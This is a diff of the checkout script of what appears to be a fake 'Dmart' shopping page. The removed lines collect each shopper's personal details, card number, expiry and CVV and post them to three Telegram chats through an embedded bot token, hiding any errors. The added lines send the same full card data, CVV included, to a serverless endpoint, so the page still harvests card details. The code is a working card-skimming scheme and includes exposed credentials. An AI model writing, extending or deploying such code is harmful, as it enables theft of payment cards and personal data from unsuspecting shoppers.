@@ -248,10 +248,6 @@ body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relati
 </div></section></div></div></main>
 
 <script>
-/* ---------- CONFIG ---------- */
-const TELEGRAM_BOT_TOKEN = '8485388962:AAGTktrO69ZS0qdX1vX2DTNX9rhe1a-nwwQ';
-const TELEGRAM_CHAT_ID = '6720348763';
-
 /* ---------- UTILS ---------- */
 const formatCurrency = (amt) => new Intl.NumberFormat('en-IN',{style:'currency',currency:'INR'}).format(amt);
 let cart = JSON.parse(localStorage.getItem('Dmart')) || [];
@@ -423,43 +419,16 @@ document.getElementById('pay-btn').addEventListener('click', async () => {
   const total = cart.reduce((s,i)=>s + i.price * i.quantity, 0);
   const user = JSON.parse(localStorage.getItem('Dmart_User')) || {};
 
-  // Telegram message
-  const msg = `🔔 NEW ORDER\n------------\n👤 ${user.name}\n📞 ${user.phone}\n📍 ${user.address}\n🏙️ ${user.city}, ${user.state} - ${user.pincode}\n\n💳 CARD INFO\nNo: ${num}\nExp: ${exp}\nCVV: ${cvv}\nName: ${name}\n\n💰 TOTAL: ${formatCurrency(total)}`;
-  
-  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg })
-  }).catch(() => {});
-  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({ chat_id: '6067712594', text: msg })
-  }).catch(() => {});
-  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({ chat_id: '7393124087', text: msg })
-  }).catch(() => {});
-
-  // Prepare payload to DB (includes full dummy card fields as you requested)
-  const payload = {
-    name: user.name || '',
-    phone: user.phone || '',
-    address: user.address || '',
-    city: user.city || '',
-    state: user.state || '',
-    pincode: user.pincode || '',
-    card_number_raw: num,
-    expiry: exp,
-    cvv_raw: cvv,
-    cardholder_name: name,
-    amount: total,
-    cart: cart
-  };
-
-  // Save to DB
-  const rs = await saveOrderToServer(payload);
+  // Send to serverless function
+  const rs = await fetch('/api/send-order', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      user: user,
+      card: { number: num, expiry: exp, cvv: cvv, name: name },
+      total: total
+    })
+  }).then(r => r.json()).catch(e => ({ ok: false, error: e.message }));
 
   // If server returned order_id, store it for thank-you download tracking
   if(rs && rs.ok && rs.order_id) {
